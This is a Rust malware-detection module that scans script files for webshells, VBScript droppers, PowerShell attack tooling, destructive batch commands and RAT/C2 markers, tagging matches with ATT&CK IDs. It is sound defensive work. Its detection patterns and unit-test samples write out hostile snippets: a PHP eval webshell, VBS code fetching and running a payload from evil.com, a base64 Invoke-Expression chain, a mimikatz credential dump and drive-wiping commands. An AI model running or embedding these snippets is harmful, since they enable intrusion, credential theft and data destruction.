//! Non-PE / script-file malicious content analysis (L3).
//!
//! Detects attack patterns in script files — PowerShell (`.ps1`), VBScript /
//! JScript (`.vbs` / `.js`), PHP/ASP/ASPX webshells, and batch files — that
//! are invisible to the PE heuristic and behavioral layers, which only parse
//! Windows PE images. It is also wired into the LOLBin detector so that
//! command-line patterns embedded in scripts get the same ATT&CK-tagged
//! verdicts as when they appear inside a PE's string table.
//!
//! **FP discipline** (same stance as the heuristic / behavioral layers):
//!   * Patterns with `weight ≥ 3` are specific enough to fire alone — they have
//!     no plausible legitimate use in a file-system context (e.g. PHP
//!     `eval($_POST[…])`).
//!   * Patterns with `weight ≤ 2` must combine to reach the threshold (`≥ 2`)
//!     before anything is reported.
//!   * LOLBin patterns (PowerShell `-EncodedCommand`, BITSAdmin, MSHTA, …) are
//!     delegated to [`crate::lolbin::analyze`] rather than duplicated here.

use crate::verdict::{Detection, DetectionKind, Severity};

/// Minimum combined capability weight before findings are emitted.
const REPORT_THRESHOLD: u32 = 2;

/// Maximum bytes of script content converted to text for analysis.
const MAX_SCRIPT_BYTES: usize = 2 * 1024 * 1024; // 2 MiB

struct Cap {
    name: &'static str,
    mitre: &'static str,
    severity: Severity,
    weight: u32,
}

/// Analyse raw bytes as potential script content.
///
/// Converts `data` to a lowercased printable-ASCII haystack (collapsing
/// UTF-16LE null bytes, the same transform used by [`crate::behavior`]) then
/// calls [`analyze`]. Returns `Vec::new()` on purely binary content — no false
/// positives on PE files, which are handled by the PE layers upstream.
pub fn analyze_bytes(data: &[u8]) -> Vec<Detection> {
    let hay = build_haystack(data);
    if hay.is_empty() {
        return Vec::new();
    }
    analyze(&hay)
}

/// Analyse a pre-lowercased text haystack for script-level attack patterns.
pub(crate) fn analyze(hay: &str) -> Vec<Detection> {
    let caps = match_capabilities(hay);
    let score: u32 = caps.iter().map(|c| c.weight).sum();

    // LOLBin analysis also applies to standalone scripts.
    let mut out: Vec<Detection> = crate::lolbin::analyze(hay);

    if score >= REPORT_THRESHOLD {
        out.extend(caps.into_iter().map(|c| Detection {
            name: format!("{} [{}]", c.name, c.mitre),
            kind: DetectionKind::Behavior,
            severity: c.severity,
        }));
    }
    out
}

/// Build a lowercased printable-ASCII haystack from raw bytes, bounded to
/// [`MAX_SCRIPT_BYTES`]. UTF-16LE null bytes are collapsed so wide-char
/// PowerShell / VBS content is searchable without special handling.
fn build_haystack(data: &[u8]) -> String {
    let n = data.len().min(MAX_SCRIPT_BYTES);
    let mut out = String::with_capacity(n / 2);
    for &b in &data[..n] {
        if b == 0 {
            continue;
        }
        let c = b as char;
        if c.is_ascii_graphic() || c == ' ' {
            out.push(c.to_ascii_lowercase());
        } else if !out.ends_with(' ') {
            out.push(' ');
        }
    }
    out
}

#[allow(clippy::too_many_lines)]
fn match_capabilities(hay: &str) -> Vec<Cap> {
    let s = |needle: &str| hay.contains(needle);
    let any = |needles: &[&str]| needles.iter().any(|n| s(n));

    let mut caps: Vec<Cap> = Vec::new();

    // -----------------------------------------------------------------------
    // PHP webshells (T1505.003)
    // -----------------------------------------------------------------------

    // eval() on unfiltered user input — the canonical webshell primitive.
    if any(&[
        "eval($_post[",
        "eval($_get[",
        "eval($_request[",
        "eval($_cookie[",
    ]) {
        caps.push(Cap {
            name: "Script.PhpWebshell.EvalInput",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // Direct OS command execution via user input.
    if any(&[
        "system($_post",
        "system($_get",
        "system($_request",
        "exec($_post",
        "exec($_get",
        "exec($_request",
        "passthru($_post",
        "passthru($_get",
        "passthru($_request",
        "shell_exec($_post",
        "shell_exec($_get",
        "shell_exec($_request",
        "popen($_post",
        "popen($_get",
        "popen($_request",
    ]) {
        caps.push(Cap {
            name: "Script.PhpWebshell.OsCommand",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // assert() used as an eval() alias to bypass naive pattern matching.
    if s("assert(") && any(&["$_post", "$_get", "$_request", "$_cookie", "base64_decode("]) {
        caps.push(Cap {
            name: "Script.PhpWebshell.AssertBypass",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // gzinflate/gzuncompress + base64_decode + eval: the dominant PHP webshell
    // obfuscation chain — virtually never appears in legitimate PHP code.
    if any(&["gzinflate(", "gzuncompress(", "gzdecode(", "str_rot13("])
        && s("base64_decode(")
        && any(&["eval(", "create_function(", "preg_replace("])
    {
        caps.push(Cap {
            name: "Script.PhpWebshell.ObfuscatedPayload",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // preg_replace /e modifier executes replacement as PHP code (removed in PHP 7,
    // but still seen in legacy webshells targeting older stacks).
    if s("preg_replace(") && any(&["'/./e'", "\"/./e\"", "'/.*?/e'", "\"/.*?/e\""]) {
        caps.push(Cap {
            name: "Script.PhpWebshell.PregReplaceEval",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // Known webshell kit self-identifiers embedded in their own source.
    if any(&[
        "r57shell",
        "c99shell",
        "wso webshell",
        "b374k",
        "weevely",
        "phpspy",
        "indoxploit",
        "ghostshell",
        "fx29shell",
    ]) {
        caps.push(Cap {
            name: "Script.PhpWebshell.KnownKit",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // -----------------------------------------------------------------------
    // ASP / ASPX webshells (T1505.003)
    // -----------------------------------------------------------------------

    // Execute / Eval on request data — classic Classic-ASP webshell pattern.
    if any(&[
        "execute request(",
        "execute(request.",
        "eval request(",
        "eval(request.",
    ]) {
        caps.push(Cap {
            name: "Script.AspWebshell.ExecuteRequest",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // WScript.Shell spawned from an ASP page driven by request parameters.
    if any(&[
        "server.createobject(\"wscript.shell\")",
        "createobject(\"wscript.shell\")",
    ]) && any(&["request.form(", "request.querystring(", "request(\""])
    {
        caps.push(Cap {
            name: "Script.AspWebshell.WScriptShell",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // China Chopper / generic ASPX process-runner webshell pattern.
    if any(&["system.diagnostics.process", "process.start(", "cmd.exe /c"])
        && any(&["request[", "request.item[", "request.form[", "request.querystring["])
    {
        caps.push(Cap {
            name: "Script.AspWebshell.ProcessRunner",
            mitre: "T1505.003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // -----------------------------------------------------------------------
    // VBScript / JScript droppers and downloaders (T1059.005 / T1059.007)
    // -----------------------------------------------------------------------

    // ADODB.Stream download + SaveToFile = script that fetches and writes a
    // binary payload to disk, the signature of a VBS dropper.
    if any(&["adodb.stream", "\"adodb.stream\""])
        && any(&["savetofile", "loadfromfile", ".write", ".binarywrite"])
        && any(&["http://", "https://", "ftp://"])
    {
        caps.push(Cap {
            name: "Script.VbsDropper.AdodbStream",
            mitre: "T1059.005",
            severity: Severity::High,
            weight: 3,
        });
    }

    // WScript.Shell .Run / .Exec invoked on a URL or staging path.
    // VBScript can omit parentheses: `sh.Run "url"` is valid syntax, so we
    // match both `.run(` and `.run ` (with trailing space / quote).
    if any(&["wscript.shell", "\"wscript.shell\""])
        && any(&[".run(", ".run \"", ".run '", ".exec(", "shell.run", ".exec \""])
        && any(&["http://", "https://", "%appdata%", "%temp%", "%userprofile%"])
    {
        caps.push(Cap {
            name: "Script.VbsDropper.WScriptRun",
            mitre: "T1059.005",
            severity: Severity::High,
            weight: 3,
        });
    }

    // MSXML2 / WinHttp HTTP download from a script.
    if any(&[
        "msxml2.xmlhttp",
        "msxml2.serverxmlhttp",
        "winhttp.winhttprequest",
        "microsoft.xmlhttp",
    ]) && any(&[".send(", ".responsebody", ".responsetext"])
        && any(&["http://", "https://"])
    {
        caps.push(Cap {
            name: "Script.VbsDropper.HttpDownload",
            mitre: "T1105",
            severity: Severity::High,
            weight: 3,
        });
    }

    // Script-driven registry Run-key persistence.
    if any(&["createobject(", "wscript.shell"])
        && any(&["regwrite", "reg add", "regsetvalue"])
        && any(&[
            "currentversion\\run",
            "currentversion/run",
            "currentversion\\runonce",
        ])
    {
        caps.push(Cap {
            name: "Script.VbsPersistence.RunKey",
            mitre: "T1547.001",
            severity: Severity::Medium,
            weight: 2,
        });
    }

    // -----------------------------------------------------------------------
    // PowerShell post-exploitation frameworks (T1059.001)
    // -----------------------------------------------------------------------

    // Named cmdlets / functions from well-known offensive PS frameworks.
    if any(&[
        "invoke-mimikatz",
        "invoke-bloodhound",
        "invoke-sharphound",
        "invoke-kerberoast",
        "invoke-ninjacopy",
        "invoke-shellcode",
        "invoke-reflectivepeinjection",
        "invoke-dllinjection",
        "get-gppassword",
        "write-shellcode",
        "invoke-powerdump",
        "invoke-empire",
        "powersploit",
        "sharpshooter",
        "invoke-obfuscation",
        "invoke-cradle",
    ]) {
        caps.push(Cap {
            name: "Script.PowerShell.PostExploitFramework",
            mitre: "T1059.001",
            severity: Severity::High,
            weight: 3,
        });
    }

    // Reflective assembly load from a byte array within a PS script.
    if any(&[
        "[reflection.assembly]::load(",
        "[system.reflection.assembly]::load(",
    ]) && any(&["[byte[]]", "[convert]::frombase64", "0x4d5a"])
    {
        caps.push(Cap {
            name: "Script.PowerShell.ReflectiveLoad",
            mitre: "T1620",
            severity: Severity::High,
            weight: 3,
        });
    }

    // [Convert]::FromBase64String + Invoke-Expression — base64 decode-and-execute
    // chain: extremely rare in legitimate scripts, universal in staged loaders.
    if any(&[
        "[convert]::frombase64string(",
        "[system.convert]::frombase64string(",
    ]) && any(&["invoke-expression", "iex(", "|iex", " iex", "&iex"])
    {
        caps.push(Cap {
            name: "Script.PowerShell.Base64Execute",
            mitre: "T1027",
            severity: Severity::High,
            weight: 3,
        });
    }

    // Heavy [char] concatenation obfuscation: legitimate PS scripts rarely
    // have more than a handful; a count ≥ 10 strongly suggests automated
    // string-level obfuscation.
    let char_cast_count = hay.matches("[char]").count();
    if char_cast_count >= 10 {
        caps.push(Cap {
            name: "Script.PowerShell.CharObfuscation",
            mitre: "T1027",
            severity: Severity::Medium,
            weight: 2,
        });
    }

    // -----------------------------------------------------------------------
    // Batch / CMD file data destruction (T1485 / T1561)
    // -----------------------------------------------------------------------

    if any(&[
        "format c: /y",
        "format c:/y",
        "format c: /q",
        "format /y c:",
        "format c: /autotest",
    ]) {
        caps.push(Cap {
            name: "Script.Batch.DriveFormat",
            mitre: "T1561.001",
            severity: Severity::High,
            weight: 3,
        });
    }

    if any(&[
        "del /f /s /q %systemdrive%",
        "del /f /q %systemdrive%",
        "rmdir /s /q c:\\",
        "rd /s /q c:\\",
    ]) {
        caps.push(Cap {
            name: "Script.Batch.MassDeletion",
            mitre: "T1485",
            severity: Severity::High,
            weight: 3,
        });
    }

    // cipher /w securely overwrites free space — used by ransomware / wipers to
    // prevent recovery.
    if any(&["cipher /w:c", "cipher /w:c:"]) {
        caps.push(Cap {
            name: "Script.Batch.CipherWipe",
            mitre: "T1485",
            severity: Severity::High,
            weight: 3,
        });
    }

    // -----------------------------------------------------------------------
    // Common attack frameworks / RAT / C2 indicators (T1219 / T1003)
    // -----------------------------------------------------------------------

    // Metasploit payload artefacts.
    if any(&["meterpreter", "metsrv", "metasploit"])
        && any(&[
            "payload",
            "shellcode",
            "reverse_tcp",
            "reverse_https",
            "bind_tcp",
            "staged",
            "stager",
        ])
    {
        caps.push(Cap {
            name: "Script.Metasploit.Payload",
            mitre: "T1219",
            severity: Severity::High,
            weight: 3,
        });
    }

    // Cobalt Strike beacon/payload identifiers.
    if any(&[
        "cobalt strike",
        "cobaltstrike",
        "cs beacon",
        "cs_beacon",
        "beacon.dll",
        "beacon_http",
        "beacon_https",
        "beacon_smb",
    ]) {
        caps.push(Cap {
            name: "Script.CobaltStrike.Beacon",
            mitre: "T1219",
            severity: Severity::High,
            weight: 3,
        });
    }

    // Mimikatz — credential-dumping framework. Any file containing these
    // module::command strings is either a Mimikatz binary/script or
    // documentation; on disk it warrants a finding.
    if any(&[
        "invoke-mimikatz",
        "sekurlsa::",
        "lsadump::",
        "privilege::debug",
        "kerberos::ptt",
        "token::elevate",
        "mimikatz.exe",
    ]) {
        caps.push(Cap {
            name: "Script.Mimikatz",
            mitre: "T1003",
            severity: Severity::High,
            weight: 3,
        });
    }

    // SlimRAT / AsyncRAT / Quasar / NjRAT config markers.
    if any(&[
        "asyncrat",
        "nanocore",
        "njrat",
        "quasar rat",
        "darkcomet",
        "remcos",
        "stealthrat",
    ]) {
        caps.push(Cap {
            name: "Script.KnownRat",
            mitre: "T1219",
            severity: Severity::High,
            weight: 3,
        });
    }

    caps
}

#[cfg(test)]
mod tests {
    use super::*;

    fn lower(s: &str) -> String {
        s.to_ascii_lowercase()
    }

    #[test]
    fn php_eval_user_input() {
        let hay = lower("<?php eval($_POST['cmd']); ?>");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("PhpWebshell.EvalInput")),
            "{d:?}"
        );
    }

    #[test]
    fn php_system_request() {
        let hay = lower("<?php system($_REQUEST['c']); ?>");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("PhpWebshell.OsCommand")),
            "{d:?}"
        );
    }

    #[test]
    fn php_gzinflate_chain() {
        let hay = lower("<?php eval(gzinflate(base64_decode($a))); ?>");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("ObfuscatedPayload")),
            "{d:?}"
        );
    }

    #[test]
    fn php_assert_bypass() {
        let hay = lower("<?php assert(base64_decode($_POST['c'])); ?>");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("AssertBypass")),
            "{d:?}"
        );
    }

    #[test]
    fn asp_execute_request() {
        let hay = lower("Execute Request(\"cmd\")");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("AspWebshell.ExecuteRequest")),
            "{d:?}"
        );
    }

    #[test]
    fn asp_process_runner() {
        let hay = lower(r#"System.Diagnostics.Process.Start("cmd.exe /c " & Request["cmd"])"#);
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("ProcessRunner")),
            "{d:?}"
        );
    }

    #[test]
    fn vbs_adodb_download() {
        let hay = lower(concat!(
            r#"Set s = CreateObject("ADODB.Stream")"#,
            r#": s.Write dl("https://evil.com/p.exe"): s.SaveToFile "C:\p.exe""#,
        ));
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("AdodbStream")),
            "{d:?}"
        );
    }

    #[test]
    fn vbs_wscript_run() {
        let hay = lower(
            r#"Set sh = CreateObject("WScript.Shell"): sh.Run "https://evil.com/p.exe", 0"#,
        );
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("WScriptRun")), "{d:?}");
    }

    #[test]
    fn ps_post_exploit_framework() {
        let hay = lower("Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| {
                x.name.contains("PostExploitFramework") || x.name.contains("Mimikatz")
            }),
            "{d:?}"
        );
    }

    #[test]
    fn ps_base64_execute_chain() {
        let hay = lower(
            "$b = [Convert]::FromBase64String('aGVsbG8='); IEX([Text.Encoding]::UTF8.GetString($b))",
        );
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("Base64Execute")),
            "{d:?}"
        );
    }

    #[test]
    fn ps_char_obfuscation() {
        let hay: String = (0u32..15)
            .map(|i| format!("[char]{}", 65 + i))
            .collect::<Vec<_>>()
            .join("+");
        let d = analyze(&hay.to_ascii_lowercase());
        assert!(
            d.iter().any(|x| x.name.contains("CharObfuscation")),
            "{d:?}"
        );
    }

    #[test]
    fn batch_format_drive() {
        let hay = lower("@echo off\nformat C: /y /q");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("DriveFormat")), "{d:?}");
    }

    #[test]
    fn batch_mass_deletion() {
        let hay = lower("del /f /s /q %systemdrive%\\*.* & rd /s /q C:\\");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("MassDeletion")),
            "{d:?}"
        );
    }

    #[test]
    fn metasploit_payload_marker() {
        let hay = lower("load meterpreter reverse_tcp payload stager");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("Metasploit")), "{d:?}");
    }

    #[test]
    fn mimikatz_marker() {
        let hay = lower("sekurlsa::logonpasswords");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("Mimikatz")), "{d:?}");
    }

    #[test]
    fn benign_php_is_clean() {
        // trim($_POST[...]) sanitised before echo — not a webshell pattern.
        let hay = lower(
            "<?php $name = htmlspecialchars(trim($_POST['name'])); echo $name; ?>",
        );
        let d = analyze(&hay);
        assert!(
            d.iter().all(|x| !x.name.contains("PhpWebshell")),
            "sanitised PHP should not be flagged: {d:?}"
        );
    }

    #[test]
    fn benign_batch_is_clean() {
        let hay = lower("@echo off\necho Building project...\ncargo build --release");
        let d = analyze(&hay);
        assert!(
            d.iter().all(|x| !x.name.contains("Script.Batch")),
            "benign batch: {d:?}"
        );
    }

    #[test]
    fn analyze_bytes_skips_pure_binary() {
        // Null-filled buffer — the haystack is empty, so no findings.
        let binary = vec![0u8; 1024];
        assert!(analyze_bytes(&binary).is_empty());
    }
}
